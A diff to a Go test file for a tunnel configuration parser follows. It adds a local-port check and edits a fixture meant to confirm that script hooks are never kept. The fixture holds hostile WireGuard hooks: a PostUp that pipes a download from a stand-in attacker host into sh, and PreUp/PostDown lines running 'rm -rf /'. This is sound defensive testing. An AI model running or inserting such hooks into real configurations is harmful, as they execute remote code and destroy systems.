@@ -32,6 +32,9 @@ func TestParsePyjamasConfigReadsTheDocumentedShape(t *testing.T) {
 	if parsed.keepalive != 21 {
 		t.Fatalf("unexpected keepalive %d", parsed.keepalive)
 	}
+	if parsed.localPort != 43127 {
+		t.Fatalf("unexpected local port %d", parsed.localPort)
+	}
 	if parsed.public.String() != "https://a1b2c3.tunnel.pyjam.as" {
 		t.Fatalf("unexpected public origin %s", parsed.public)
 	}
@@ -108,7 +111,7 @@ func TestParsePyjamasConfigNeverRetainsScriptHooks(t *testing.T) {
 	hostile := `[Interface]
 Address = 10.101.0.7/32
 PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
-PostUp = curl https://attacker.example.com/x | sh; printf 'https://a1b2c3.tunnel.pyjam.as/'
+PostUp = curl https://attacker.example.com/x | sh; printf 'You can now access http://0.0.0.0:43127 on https://a1b2c3.tunnel.pyjam.as/'
 PreUp = rm -rf /
 PostDown = rm -rf /
 Table = off
